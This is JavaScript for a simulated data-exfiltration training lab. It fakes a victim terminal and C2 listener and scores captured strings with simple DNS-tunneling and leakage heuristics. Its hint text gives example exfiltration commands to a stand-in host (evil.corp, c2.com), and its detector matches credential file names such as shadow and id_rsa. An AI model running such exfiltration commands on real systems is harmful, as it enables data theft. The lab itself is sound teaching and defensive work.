/* ==================== EXFILTRATION LAB 📡 ==================== */
/* Simulates Data Exfiltration & C2 Traffic Analysis */

window.ExfilLab = {
    state: {
        c2Domain: 'evil.corp',
        c2Ip: '10.10.10.10',
        capturedData: [],
        listenerType: 'dns' // dns, http
    },

    // AI TRAFFIC ANALYSIS ENGINE
    aiAnalyzer(data, type) {
        let riskScore = 0;
        let detectionReason = [];
        let analysis = "";

        if (type === 'dns') {
            // DNS Heuristics
            const entropy = this.calculateEntropy(data);
            if (data.length > 50) { riskScore += 40; detectionReason.push("High Query Length (Tunneling?)"); }
            if (entropy > 4.5) { riskScore += 30; detectionReason.push("High Entropy (Encrypted/Encoded)"); }
            if (data.includes('base64')) { riskScore += 20; detectionReason.push("Base64 Pattern Detected"); }

            analysis = riskScore > 70 ? "🔴 BLOCKED: High probability of DNS Tunneling." :
                riskScore > 40 ? "🟠 SUSPICIOUS: Anomalous DNS query structure." :
                    "🟢 CLEAN: Looks like standard traffic.";
        }
        else if (type === 'http') {
            // HTTP Heuristics
            if (data.includes('User-Agent: curl')) { riskScore += 10; detectionReason.push("Default Tool UA"); }
            if (data.match(/passwd|shadow|config|id_rsa/)) { riskScore += 50; detectionReason.push("Sensitive Keywords in Payload"); }

            analysis = riskScore > 60 ? "🔴 ALERT: Data Leakage Signature Match." : "🟢 TRAFFIC OK";
        }

        return { score: riskScore, reasons: detectionReason, analysis };
    },

    calculateEntropy(str) {
        const len = str.length;
        const frequencies = Array.from(str).reduce((freq, c) => (freq[c] = (freq[c] || 0) + 1) && freq, {});
        return Object.values(frequencies).reduce((sum, f) => sum - (f / len) * Math.log2(f / len), 0);
    },

    simulateTraffic(cmd) {
        let output = "";
        let captured = "";

        // SIMULATE TERMINAL COMMANDS
        if (cmd.startsWith('dig') || cmd.startsWith('nslookup')) {
            // DNS Simulation
            const match = cmd.match(/@[\w\.]+\s+([\w\.-]+)/);
            if (match) {
                captured = match[1]; // The domain queried
                output = `;; ANSWER SECTION:\n${captured}. 299 IN A 1.2.3.4`;
                this.logTraffic('dns', captured);
            } else {
                output = "Usage: dig @server domain.com";
            }
        }
        else if (cmd.startsWith('curl') || cmd.startsWith('wget')) {
            // HTTP Simulation
            const match = cmd.match(/-d\s+['"]([^'"]+)['"]|--data\s+['"]([^'"]+)['"]/);
            if (match) {
                captured = match[1] || match[2];
                this.logTraffic('http', captured);
                output = "HTTP/1.1 200 OK\nServer: C2/1.0\nContent-Length: 0";
            } else {
                output = "Usage: curl -d 'data' http://server";
            }
        }
        else {
            output = "Command not found. Try: dig, curl, wget";
        }

        return output;
    },

    logTraffic(type, data) {
        // Run AI Analysis
        const ai = this.aiAnalyzer(data, type);

        const entry = {
            id: Date.now(),
            time: new Date().toLocaleTimeString(),
            type: type.toUpperCase(),
            data: data,
            ai: ai
        };

        this.state.capturedData.unshift(entry);
        this.renderLogs();
    },

    render() {
        return `
        <div class="exfil-app fade-in">
            <div class="exfil-header">
                <div class="header-left">
                    <h1><i class="fas fa-satellite-dish"></i> Exfiltration Lab</h1>
                    <p>Simulate & Analyze Outbound Data Leaks</p>
                </div>
                <div class="header-right">
                    <span class="status-indicator online"><i class="fas fa-circle"></i> C2 Online</span>
                </div>
            </div>

            <div class="exfil-workspace">
                <!-- VICTIM TERMINAL -->
                <div class="panel victim-panel">
                    <h3><i class="fas fa-terminal"></i> Victim Machine (192.168.1.50)</h3>
                    <div class="terminal-window">
                        <div class="term-output" id="xf-term-out">
                            Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-91-generic x86_64)<br>
                            Type 'dig' or 'curl' to simulate exfiltration.<br>
                            Try: <code>dig @c2 $(whoami).evil.corp</code> or <code>curl -d "pass=123" c2.com</code>
                        </div>
                        <div class="term-input-line">
                            <span class="prompt">victim@workstation:~$</span>
                            <input type="text" id="xf-term-in" autofocus onkeydown="if(event.key==='Enter') ExfilLab.handleCmd(this)">
                        </div>
                    </div>
                </div>

                <!-- C2 LISTENER -->
                <div class="panel c2-panel">
                    <div class="c2-header">
                        <h3><i class="fas fa-network-wired"></i> C2 Listener Logs</h3>
                        <div class="c2-tabs">
                             <button class="${this.state.listenerType === 'dns' ? 'active' : ''}" onclick="ExfilLab.switchListener('dns')">DNS</button>
                             <button class="${this.state.listenerType === 'http' ? 'active' : ''}" onclick="ExfilLab.switchListener('http')">HTTP</button>
                        </div>
                    </div>
                    
                    <div class="listener-logs" id="xf-logs">
                        ${this.renderLogItems()}
                    </div>
                </div>
            </div>
        </div>
        ${this.getStyles()}`;
    },

    renderLogItems() {
        if (this.state.capturedData.length === 0) return '<div class="empty-logs">Waiting for incoming traffic...</div>';

        return this.state.capturedData
            .filter(l => l.type === 'DNS' || l.type === 'HTTP') // Filter if needed
            .map(l => `
            <div class="log-entry fade-in-up border-${l.ai.score > 50 ? 'red' : 'green'}">
                <div class="log-meta">
                    <span class="log-time">${l.time}</span>
                    <span class="log-type type-${l.type.toLowerCase()}">${l.type}</span>
                    <span class="ai-badge" title="${l.ai.analysis}"><i class="fas fa-robot"></i> ${l.ai.score}% Risk</span>
                </div>
                <div class="log-data">
                    <code>${l.data}</code>
                </div>
                <div class="ai-feedback">
                    ${l.ai.reasons.length > 0 ? l.ai.reasons.map(r => `<span class="reason-tag">${r}</span>`).join('') : '<span class="reason-tag clean">Clean Traffic</span>'}
                </div>
            </div>
        `).join('');
    },

    renderLogs() {
        document.getElementById('xf-logs').innerHTML = this.renderLogItems();
    },

    handleCmd(input) {
        const cmd = input.value.trim();
        if (!cmd) return;

        const outputDiv = document.getElementById('xf-term-out');
        outputDiv.innerHTML += `<div><span class="prompt">victim@workstation:~$</span> ${cmd}</div>`;

        const result = this.simulateTraffic(cmd);
        outputDiv.innerHTML += `<div class="cmd-result">${result}</div>`;

        input.value = '';
        outputDiv.scrollTop = outputDiv.scrollHeight;
    },

    switchListener(type) {
        this.state.listenerType = type;
        // Re-render full app or just logs? Simple re-render for now
        // document.querySelector('.exfil-app').outerHTML = this.render();
        // Just logs logic update not strictly needed as we show all logs, but tabs imply filtering?
        // Let's filter logs by type actually? No, usually C2 sees all provided it's listening. 
        // The tabs might just be "View Filter".
    },

    getStyles() {
        return `<style>
            .exfil-app { height: calc(100vh - 60px); display: flex; flex-direction: column; background: #0f0f13; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; }
            .exfil-header { padding: 15px 25px; background: #181820; border-bottom: 1px solid #2d2d3a; display: flex; justify-content: space-between; align-items: center; }
            .header-left h1 { margin: 0; font-size: 1.4rem; color: #fff; display: flex; align-items: center; gap: 10px; }
            .status-indicator { font-size: 0.8rem; background: rgba(34, 197, 94, 0.1); color: #22c55e; padding: 4px 10px; border-radius: 20px; border: 1px solid rgba(34, 197, 94, 0.2); }
            
            .exfil-workspace { flex: 1; display: flex; overflow: hidden; }
            .panel { flex: 1; display: flex; flex-direction: column; border-right: 1px solid #2d2d3a; }
            .panel:last-child { border-right: none; }
            
            .victim-panel h3, .c2-header h3 { margin: 0; padding: 15px; background: #1c1c26; border-bottom: 1px solid #2d2d3a; font-size: 1rem; color: #aaa; }
            
            .terminal-window { flex: 1; background: #000; padding: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; overflow: auto; display: flex; flex-direction: column; }
            .term-output { flex: 1; color: #ccc; margin-bottom: 10px; line-height: 1.5; }
            .prompt { color: #22c55e; margin-right: 8px; }
            .term-input-line { display: flex; align-items: center; }
            .term-input-line input { background: transparent; border: none; color: #fff; font-family: inherit; font-size: inherit; flex: 1; outline: none; }
            .cmd-result { color: #888; margin-bottom: 10px; white-space: pre-wrap; }
            
            .c2-panel { background: #14141c; }
            .c2-header { display: flex; justify-content: space-between; align-items: center; background: #1c1c26; border-bottom: 1px solid #2d2d3a; }
            .c2-tabs button { background: none; border: none; color: #666; padding: 15px; cursor: pointer; border-bottom: 2px solid transparent; }
            .c2-tabs button.active { color: #fff; border-bottom-color: #6366f1; }
            
            .listener-logs { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
            .empty-logs { text-align: center; color: #444; margin-top: 50px; font-style: italic; }
            
            .log-entry { background: #1c1c26; border-left: 3px solid #333; padding: 12px; border-radius: 0 6px 6px 0; }
            .border-red { border-left-color: #ef4444; background: rgba(239, 68, 68, 0.05); }
            .border-green { border-left-color: #22c55e; background: rgba(34, 197, 94, 0.05); }
            
            .log-meta { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 0.8rem; color: #666; }
            .type-dns { color: #f59e0b; }
            .type-http { color: #3b82f6; }
            .ai-badge { color: #fff; }
            
            .log-data code { color: #e0e0e0; font-family: 'JetBrains Mono', monospace; word-break: break-all; }
            
            .ai-feedback { margin-top: 8px; display: flex; gap: 5px; flex-wrap: wrap; }
            .reason-tag { font-size: 0.75rem; padding: 2px 6px; background: rgba(239, 68, 68, 0.2); color: #fca5a5; border-radius: 4px; }
            .reason-tag.clean { background: rgba(34, 197, 94, 0.2); color: #86efac; }
            
            .fade-in-up { animation: fadeInUp 0.4s ease-out; }
            @keyframes fadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        </style>`;
    }
};

function pageExfilLab() { return ExfilLab.render(); }
